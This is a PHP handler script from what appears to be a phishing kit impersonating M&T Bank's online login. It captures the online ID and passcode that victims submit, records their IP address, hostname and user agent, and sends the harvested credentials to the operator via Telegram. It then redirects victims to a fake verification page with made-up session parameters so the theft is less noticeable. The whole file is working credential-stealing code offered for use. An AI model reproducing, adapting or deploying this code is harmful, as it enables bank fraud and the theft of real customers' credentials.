<?php
require('config.php');
if($_POST["name1"] != "" and $_POST["name2"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------DWA M&T Access-----------------------\n";
$message .= "Online ID            : ".$_POST['name1']."\n";
$message .= "Passcode           : ".$_POST['name2']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
$message = "DWA M&T Access | $ip \n".$message;
{
send_telegram_msg($message);
}
$praga=rand();
$praga=md5($praga);
  header ("Location: verif.php?cmd=login_submit&id=$praga$praga&session=$praga$praga");
}else{
header ("Location: verif.php");
}

?>